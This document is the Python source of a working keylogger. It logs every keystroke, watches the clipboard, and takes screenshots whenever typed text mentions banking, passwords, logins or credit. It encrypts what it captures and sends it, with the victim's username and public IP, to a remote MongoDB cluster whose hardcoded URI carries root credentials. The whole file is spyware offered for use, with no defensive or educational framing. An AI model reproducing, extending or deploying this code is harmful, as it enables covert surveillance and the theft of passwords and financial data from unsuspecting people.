
import time
import threading
import pymongo
import pyperclip
import base64
import requests
import getpass
import pyautogui
import os
import zlib
from Crypto.Cipher import AES
from pynput import keyboard
import io
from datetime import datetime
from typing import Optional
from pymongo.errors import ConnectionFailure

# Configuration Constants
AES_KEY = os.getenv('AES_KEY', bytes.fromhex("82d5d6060dff58f5875d520a6202b5384cfba4779a9db4e9c59ca3bce444a53e"))
MONGO_URI = os.getenv('MONGO_URI', "mongodb+srv://root:root@cluster0.m8lbp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
SENSITIVE_WORDS = ["bank", "password", "login", "credit"]
MAX_RETRIES = 3
BATCH_SIZE = 50
RATE_LIMIT = 100  # Max operations per minute

class RateLimiter:
    def __init__(self, max_ops: int, interval: int = 60):
        self.max_ops = max_ops
        self.interval = interval
        self.operations = []
        self._lock = threading.Lock()
    
    def can_proceed(self) -> bool:
        current_time = time.time()
        with self._lock:
            self.operations = [op for op in self.operations if current_time - op < self.interval]
            if len(self.operations) < self.max_ops:
                self.operations.append(current_time)
                return True
        return False

class DatabaseManager:
    def __init__(self):
        self.client = None
        self.rate_limiter = RateLimiter(RATE_LIMIT)
        self.connect_with_retry()

    def connect_with_retry(self):
        for attempt in range(MAX_RETRIES):
            try:
                self.client = pymongo.MongoClient(MONGO_URI)
                self.db = self.client["keylogger2_db"]
                self.logs = self.db["logs"]
                self.screenshots = self.db["screenshots"]
                self.clipboard = self.db["clipboard_logs"]
                self.client.admin.command('ping')
                return
            except ConnectionFailure:
                if attempt == MAX_RETRIES - 1:
                    raise
                time.sleep(2 ** attempt)

    def insert_document(self, collection: str, document: dict) -> bool:
        if not self.rate_limiter.can_proceed():
            return False
        
        try:
            getattr(self, collection).insert_one(document)
            return True
        except Exception as e:
            print(f"[ERROR] Database insert failed: {e}")
            return False

class Encryptor:
    @staticmethod
    def compress_and_encrypt(data: str) -> str:
        compressed = zlib.compress(data.encode("utf-8"))
        cipher = AES.new(AES_KEY, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(compressed)
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode("utf-8")

    @staticmethod
    def decrypt_and_decompress(enc_text: str) -> str:
        try:
            raw = base64.b64decode(enc_text)
            nonce, tag, ctext = raw[:16], raw[16:32], raw[32:]
            cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
            compressed = cipher.decrypt_and_verify(ctext, tag)
            return zlib.decompress(compressed).decode("utf-8")
        except Exception:
            return ""

class KeyLogger:
    def __init__(self):
        self.db = DatabaseManager()
        self.encryptor = Encryptor()
        self.username = getpass.getuser()
        self.ip = self.get_public_ip()
        self.keystroke_batch = []
        self.batch_lock = threading.Lock()

    @staticmethod
    def get_public_ip() -> str:
        try:
            return requests.get("https://api64.ipify.org?format=json", timeout=5).json().get("ip", "Unknown IP")
        except Exception:
            return "Unknown IP"

    @staticmethod
    def get_timestamp() -> str:
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

    def capture_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG", optimize=True, quality=85)
            img_bytes = buffer.getvalue()
            
            doc = {
                "ip": self.ip,
                "user": self.username,
                "screenshot": self.encryptor.compress_and_encrypt(base64.b64encode(img_bytes).decode()),
                "timestamp": self.get_timestamp()
            }
            
            if self.db.insert_document("screenshots", doc):
                print(f"[SCREENSHOT] Captured at {doc['timestamp']}")
        except Exception as e:
            print(f"[ERROR] Screenshot failed: {e}")

    def log_clipboard(self):
        last_clipboard = ""
        while True:
            try:
                content = pyperclip.paste().strip()
                if content and content != last_clipboard:
                    doc = {
                        "ip": self.ip,
                        "user": self.username,
                        "clipboard": self.encryptor.compress_and_encrypt(content),
                        "timestamp": self.get_timestamp()
                    }
                    if self.db.insert_document("clipboard", doc):
                        last_clipboard = content
            except Exception as e:
                print(f"[ERROR] Clipboard logging failed: {e}")
            time.sleep(5)

    def on_press(self, key):
        try:
            keystroke = self.parse_key(key)
            timestamp = self.get_timestamp()

            doc = {
                "ip": self.ip,
                "user": self.username,
                "keystroke": self.encryptor.compress_and_encrypt(keystroke),
                "timestamp": timestamp
            }

            if self.db.insert_document("logs", doc):
                print(f"[LOG] Key: {keystroke} at {timestamp}")

            with self.batch_lock:
                self.keystroke_batch.append(keystroke)

        except Exception as e:
            print(f"[ERROR] Keystroke logging failed: {e}")

    @staticmethod
    def parse_key(key) -> str:
        if key == keyboard.Key.backspace:
            return "[BACKSPACE]"
        elif key == keyboard.Key.enter:
            return "[ENTER]"
        elif key == keyboard.Key.space:
            return " "
        elif hasattr(key, 'char') and key.char is not None:
            return key.char
        return f"[{key}]"

    def analyze_keystroke_batch(self):
        while True:
            time.sleep(3)
            with self.batch_lock:
                if not self.keystroke_batch:
                    continue
                typed_text = "".join(self.keystroke_batch).lower()
                self.keystroke_batch = []

            if any(word in typed_text for word in SENSITIVE_WORDS):
                print(f"[ALERT] Sensitive word detected in batch")
                threading.Thread(target=self.capture_screenshot, daemon=True).start()

    def start(self):
        threading.Thread(target=self.log_clipboard, daemon=True).start()
        threading.Thread(target=self.analyze_keystroke_batch, daemon=True).start()

        try:
            with keyboard.Listener(on_press=self.on_press) as listener:
                print("[INFO] Keylogger started. Press CTRL+C to stop.")
                listener.join()
        except KeyboardInterrupt:
            print("[INFO] Stopping keylogger...")
            if self.db.client:
                self.db.client.close()

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()
